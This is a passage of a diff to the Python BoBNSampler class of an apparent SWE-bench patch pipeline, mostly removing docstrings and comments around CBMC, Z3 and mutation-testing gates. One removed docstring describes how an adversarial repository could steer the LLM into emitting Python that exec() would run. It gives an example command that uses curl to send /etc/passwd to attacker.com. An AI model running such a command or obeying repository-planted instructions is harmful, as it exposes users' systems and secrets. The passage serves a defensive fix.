-        Extract added C/C++ content from the diff and run CBMC on it.
-
-        GAP 5 FIX: Closes the gap where CBMC only ran in FormalVerifierAgent
-        (post-commit) and never during BoBN candidate selection.
-
-        Detection:
-          Inspects '--- a/...' headers in the diff to determine whether any
-          touched file has a C/C++ extension.  Skips silently for non-C patches.
-
-        Harness:
-          The added lines (+lines) are extracted from the diff, wrapped in a
-          minimal harness function, and written to a temporary .c file.  This
-          is intentionally lightweight — the goal is to catch obvious memory
-          safety violations (buffer overruns, null derefs, integer overflows)
-          introduced by the patch, not full compilation of the whole codebase.
-
-        Returns:
-          True  — no counterexample found, or gate was skipped (cbmc absent,
-                  timeout, non-C patch).
-          False — CBMC returned rc=10 (confirmed counterexample).
-        """
+        """Extract added C/C++ content from the diff and run CBMC on it."""
         import shutil
 
-        # ── Detect C/C++ files in diff ────────────────────────────────────────
         _c_extensions = {".c", ".cpp", ".cc", ".cxx", ".h", ".hpp", ".hxx"}
         touched_files = [
             ln.split()[-1]
@@ -724,7 +809,6 @@ class BoBNSampler:
             log.debug(f"[cbmc_gate] {instance_id}: cbmc not in PATH — layer skipped")
             return True
 
-        # ── Extract added lines as C content ──────────────────────────────────
         added_lines = [
             line[1:] for line in patch.split("\n")
             if line.startswith("+") and not line.startswith("+++")
@@ -733,7 +817,6 @@ class BoBNSampler:
         if not c_content:
             return True
 
-        # ── Wrap in minimal CBMC harness ──────────────────────────────────────
         harness = (
             "#include <stdint.h>\n"
             "#include <stdbool.h>\n"
@@ -772,9 +855,6 @@ class BoBNSampler:
                 timeout=_CBMC_TIMEOUT_S,
             )
 
-            # rc=0  → VERIFICATION SUCCESSFUL (no violations)
-            # rc=10 → VERIFICATION FAILED (concrete counterexample)
-            # other → parse error / unsupported input → skip
             if result.returncode == 10:
                 log.warning(
                     f"[cbmc_gate] {instance_id}: CBMC counterexample found "
@@ -802,6 +882,7 @@ class BoBNSampler:
             return True
         finally:
             if tmp_path:
+                from pathlib import Path
                 Path(tmp_path).unlink(missing_ok=True)
 
     async def _run_z3_gate(self, patch: str, instance_id: str) -> bool:
@@ -809,26 +890,13 @@ class BoBNSampler:
         Ask the routing LLM to extract Z3 assertions for the patch's key
         invariants, then verify them with the z3-solver Python package.
 
-        SEC-01 FIX: The previous implementation called exec(z3_code, namespace)
-        on raw LLM output derived from repository source code. An adversarial
-        repository could embed content causing the LLM to emit arbitrary Python
-        (e.g. subprocess.run(['curl','attacker.com','-d',open('/etc/passwd').read()])).
-        exec() with no __builtins__ restriction and the full z3 namespace available
-        gave near-unrestricted code execution.
-
-        This implementation asks the LLM for structured JSON describing Z3
-        constraints and constructs the solver programmatically using the safe
-        z3.parse_smt2_string() API. LLM output is never executed.
-
-        Returns True  — assertions are satisfiable or gate was skipped.
-        Returns False — Z3 produced a concrete unsat result (counterexample).
-        Raises RuntimeError for infrastructure failures (caller skips layer).
+        Uses parse_smt2_string() — LLM output is never exec()'d.
+        Returns True (pass/skipped) or False (concrete counterexample).
         """
         import importlib.util
         if importlib.util.find_spec("z3") is None:
-            raise RuntimeError("z3-solver not installed — Layer 3 skipped")
+            raise RuntimeError("z3-solver not installed — Layer 4 skipped")
 
-        # Ask the LLM to return a safe JSON DSL, not executable Python.
         prompt = (
             "You are a formal verification assistant.\n"
             "Given the patch below, extract at most 3 key safety invariants.\n"
@@ -854,10 +922,9 @@ class BoBNSampler:
         except Exception as exc:
             raise RuntimeError(f"LLM extraction failed: {exc}") from exc
 
-        # Parse the JSON response — never eval/exec it.
-        import json, re
-        clean = re.sub(r"```(?:json)?\s*", "", raw).strip()
-        match = re.search(r"\{.*\}", clean, re.DOTALL)
+        import re as _re
+        clean = _re.sub(r"```(?:json)?\s*", "", raw).strip()
+        match = _re.search(r"\{.*\}", clean, _re.DOTALL)
         if not match:
             log.debug(f"[z3_gate] {instance_id}: LLM returned no JSON — skipping")
             return True
@@ -874,14 +941,12 @@ class BoBNSampler:
             log.debug(f"[z3_gate] {instance_id}: no assertions — skipping")
             return True
 
-        # Construct Z3 solver from the safe JSON DSL without exec().
         try:
             import z3
             sort_map = {"Int": z3.IntSort(), "Bool": z3.BoolSort()}
             var_decls = []
             for var_name, sort_name in variables.items():
                 sort = sort_map.get(sort_name, z3.IntSort())
-                # Emit SMT-LIB2 declare-const for each variable.
                 smt_sort = "Int" if sort == z3.IntSort() else "Bool"
                 var_decls.append(f"(declare-const {var_name} {smt_sort})")
 
@@ -919,34 +984,6 @@ class BoBNSampler:
         winner:      BoBNCandidate,
         result:      BoBNResult,
     ) -> BoBNCandidate:
-        """
-        Generate a test suite for the winning patch and verify mutation score.
-
-        GAP 5 FIX: Previously TestGeneratorAgent and MutationVerifierAgent were
-        only called from controller._phase_fix_gap5() AFTER BoBNSampler.sample()
-        returned — so the SWE-bench evaluator path had no mutation coverage gate
-        at all.  This method wires both agents inline so every call path (evaluator
-        and controller) executes the full audit diagram step:
-          Formal Gate → Test Generator + Mutation → Commit
-
-        Requires self._storage and self._repo_root to be set at constructor time.
-        When either is absent, this method returns the winner unchanged (gate
-        skipped, result.*_gate_passed remain None).
-
-        Mutation gate failure does NOT drop the winner.  It marks
-        winner.formal_gate_passed=False and result.mutation_gate_passed=False
-        so the trajectory collector records the run as unresolved, giving the RL
-        training loop correct negative signal without silently discarding the patch.
-
-        Infrastructure failures (mutmut not installed, test generation timeout,
-        import errors) are fully non-blocking — they log a warning and return the
-        winner unchanged with gate fields set to None.
-
-        Returns
-        -------
-        The winner BoBNCandidate (possibly with formal_gate_passed=False if the
-        mutation gate failed).
-        """
         if not self._storage or not self._repo_root:
             log.debug(
                 f"[bobn] {instance_id}: test/mutation gate skipped "
@@ -956,21 +993,15 @@ class BoBNSampler:
 
         from pathlib import Path
 
-        effective_run_id  = self._run_id or instance_id
-        effective_repo    = Path(self._repo_root)
+        effective_run_id = self._run_id or instance_id
+        effective_repo   = Path(self._repo_root)
 
-        # ── Step 5.5a: TestGeneratorAgent ─────────────────────────────────────
-        # Generate a regression test suite for the winning patch.  The suite
-        # covers the functions touched by the patch so MutationVerifier can target
-        # them specifically.  Failures here are non-blocking — the mutation step
-        # can still proceed using any existing tests in the repo.
         generated_test_paths: list[str] = []
         try:
             from agents.test_generator import TestGeneratorAgent
             from agents.base import AgentConfig
 
-            tg_config = AgentConfig() if not hasattr(self, "_agent_config") else self._agent_config  # type: ignore[attr-defined]
-
+            tg_config = AgentConfig()
             tg = TestGeneratorAgent(
                 storage     = self._storage,
                 run_id      = effective_run_id,
@@ -979,11 +1010,7 @@ class BoBNSampler:
                 domain_mode = self._domain_mode,
             )
 
-            # BLOCK-02 FIX: FixAttempt has no `issue_id` field (it is `issue_ids: list[str]`)
-            # and no `patch` field. Previously these unknown kwargs were silently ignored by
-            # Pydantic, producing a stub with issue_ids=[] and no file content, so
-            # TestGeneratorAgent and MutationVerifierAgent always received empty stubs.
-            from brain.schemas import FixAttempt, FixedFile
+            from brain.schemas import FixAttempt
             fix_stub = FixAttempt(
                 run_id      = effective_run_id,
                 issue_ids   = [instance_id],
@@ -1007,21 +1034,14 @@ class BoBNSampler:
             log.debug(f"[bobn] {instance_id}: TestGeneratorAgent import skipped: {exc}")
             result.test_gate_passed = None
         except Exception as exc:
-            log.warning(
-                f"[bobn] {instance_id}: TestGeneratorAgent non-fatal error: {exc}"
-            )
+            log.warning(f"[bobn] {instance_id}: TestGeneratorAgent non-fatal error: {exc}")
             result.test_gate_passed = None
 
-        # ── Step 5.5b: MutationVerifierAgent ──────────────────────────────────
-        # Verify the generated (+ existing) test suite kills >= threshold% of
-        # mutants in the changed functions.  Gate failure marks the winner as
-        # unresolved for trajectory collection.
         try:
             from agents.mutation_verifier import MutationVerifierAgent
             from agents.base import AgentConfig
 
-            mv_config = AgentConfig() if not hasattr(self, "_agent_config") else self._agent_config  # type: ignore[attr-defined]
-
+            mv_config = AgentConfig()
             mv = MutationVerifierAgent(
                 storage          = self._storage,
                 run_id           = effective_run_id,
@@ -1031,7 +1051,6 @@ class BoBNSampler:
                 score_threshold  = self._mutation_threshold,
             )
 
-            # BLOCK-02 FIX: same correction — use issue_ids=[...] not issue_id=, remove patch=.
             from brain.schemas import FixAttempt
             fix_stub_mv = FixAttempt(
                 run_id      = effective_run_id,
@@ -1054,20 +1073,15 @@ class BoBNSampler:
                     for r in mutation_results
                 )
                 if all_passed:
-                    log.info(
-                        f"[bobn] {instance_id}: mutation gate PASSED — {scores}"
-                    )
+                    log.info(f"[bobn] {instance_id}: mutation gate PASSED — {scores}")
                 else:
                     failed = [r for r in mutation_results if not r.passed]
                     log.warning(
                         f"[bobn] {instance_id}: mutation gate FAILED — {scores} "
                         f"({len(failed)} file(s) below threshold)"
                     )
-                    # Mark winner as failing formal gate so trajectory collector
-                    # labels this run as unresolved — correct RL negative signal.
                     winner.formal_gate_passed = False
             else:
-                # mutmut found no Python files to mutate (e.g. pure C patch)
                 result.mutation_gate_passed = None
                 log.debug(
                     f"[bobn] {instance_id}: mutation gate skipped "
@@ -1077,9 +1091,7 @@ class BoBNSampler:
             log.debug(f"[bobn] {instance_id}: MutationVerifierAgent import skipped: {exc}")
             result.mutation_gate_passed = None
         except Exception as exc:
-            log.warning(
-                f"[bobn] {instance_id}: MutationVerifierAgent non-fatal error: {exc}"
-            )
+            log.warning(f"[bobn] {instance_id}: MutationVerifierAgent non-fatal error: {exc}")
             result.mutation_gate_passed = None
 
         return winner
@@ -1093,12 +1105,6 @@ class BoBNSampler:
         attack_reports: list[CriticAttackReport],
         result:         BoBNResult,
     ) -> BoBNCandidate | None:
-        """
-        Run PatchSynthesisAgent and resolve to a winning BoBNCandidate.
-
-        Falls back to composite argmax (candidates[0]) if synthesis fails.
-        Updates result.synthesis_action for observability.
-        """
         if not candidates:
             return None
 
@@ -1148,10 +1154,11 @@ class BoBNSampler:
 
         return winner
 
+    # ── Candidate generation ─────────────────────────────────────────────────
+
     async def _generate_all_candidates(
         self, n_a: int, n_b: int
     ) -> list[BoBNCandidate]:
-        """Generate N_A patches from Fixer A and N_B from Fixer B concurrently."""
         temps_a = self.router.fixer_a_temperatures()
         temps_b = self.router.fixer_b_temperatures()
         model_a = self.router.primary_model("fix")
@@ -1193,7 +1200,6 @@ class BoBNSampler:
     async def _generate_patch(
         self, model: str, temperature: float, slot: str
     ) -> str:
-        """Generate a single patch candidate from the given model and temperature."""
         from swarm.crew_roles import build_swe_bench_crew
 
         loc_prefix = (
@@ -1201,11 +1207,10 @@ class BoBNSampler:
         )
         issue_with_loc = f"{loc_prefix}{self.issue}"
 
-        # Try CrewAI crew first (structured multi-step decomposition)
         try:
             crew = build_swe_bench_crew(
-                issue_text   = issue_with_loc[:8000],
-                repo_context = self.loc_ctx[:3000] if self.loc_ctx else "",
+                issue_text     = issue_with_loc[:8000],
+                repo_context   = self.loc_ctx[:3000] if self.loc_ctx else "",
                 model_override = model,
                 temperature    = temperature,
             )
@@ -1216,13 +1221,11 @@ class BoBNSampler:
         except Exception as exc:
             log.debug(f"[bobn] crew failed for slot {slot}: {exc}")
 
-        # Fallback: direct LLM call
         return await self._direct_llm_generate(model, temperature)
 
     async def _direct_llm_generate(
         self, model: str, temperature: float
     ) -> str:
-        """Direct LLM call without CrewAI — fallback patch generator."""
         prompt = (
             f"## Issue\n{self.issue[:3000]}\n\n"
             f"{'## Edit Targets' + chr(10) + self.loc_ctx[:2000] if self.loc_ctx else ''}\n\n"
@@ -1247,7 +1250,6 @@ class BoBNSampler:
         candidates: list[BoBNCandidate],
         loop:       ExecutionFeedbackLoop,
     ) -> list[BoBNCandidate]:
-        """Run all execution loops concurrently."""
         from swe_bench.execution_loop import build_patch_refiner
 
         async def _run_one(c: BoBNCandidate) -> BoBNCandidate:
@@ -1264,10 +1266,12 @@ class BoBNSampler:
                 temperature      = c.temperature,
             )
             c.exec_result = exec_result
-            c.patch       = exec_result.final_patch  # Use best-refined patch
+            c.patch       = exec_result.final_patch
             c.test_score  = exec_result.best_score
             c.all_passed  = exec_result.all_passed
             c.exec_rounds = len(exec_result.rounds)
+            # VIB-01: populate integer count if exec loop provides it
+            c.fail_to_pass_count = getattr(exec_result, "fail_to_pass_count", 0)
             return c
 
         results = await asyncio.gather(
@@ -1289,22 +1293,14 @@ def _extract_fixed_files_from_patch(patch: str) -> list:
     """
     Parse a unified diff and return a list of FixedFile-like objects
     (path + patch slice) for each touched file.
-
-    Used by _run_test_mutation_gate to build the FixAttempt stub that
-    TestGeneratorAgent and MutationVerifierAgent require.
-
-    Returns an empty list on any parse failure — callers handle that
-    gracefully (the agents skip mutation on files with no content).
     """
     try:
         from brain.schemas import FixedFile
     except ImportError:
-        # If brain.schemas is unavailable in the test environment, return a
-        # minimal duck-typed substitute so callers still see `.path` attributes.
         class FixedFile:  # type: ignore[no-redef]
             def __init__(self, path: str, patch: str = "") -> None:
-                self.path  = path
-                self.patch = patch
+                self.path    = path
+                self.patch   = patch
                 self.content: str = ""
 
     files: list = []
@@ -1313,14 +1309,12 @@ def _extract_fixed_files_from_patch(patch: str) -> list:
 
     for line in patch.splitlines(keepends=True):
         if line.startswith("--- "):
-            # Flush previous file
             if current_file and current_lines:
                 files.append(FixedFile(
                     path  = current_file,
                     patch = "".join(current_lines),
                 ))
             current_lines = [line]
-            # Normalise "--- a/path/to/file" → "path/to/file"
             raw = line[4:].strip()
             if raw.startswith("a/") or raw.startswith("b/"):
                 raw = raw[2:]
@@ -1328,7 +1322,6 @@ def _extract_fixed_files_from_patch(patch: str) -> list:
         elif current_file:
             current_lines.append(line)
 
-    # Flush last file
     if current_file and current_lines:
         files.append(FixedFile(
             path  = current_file,
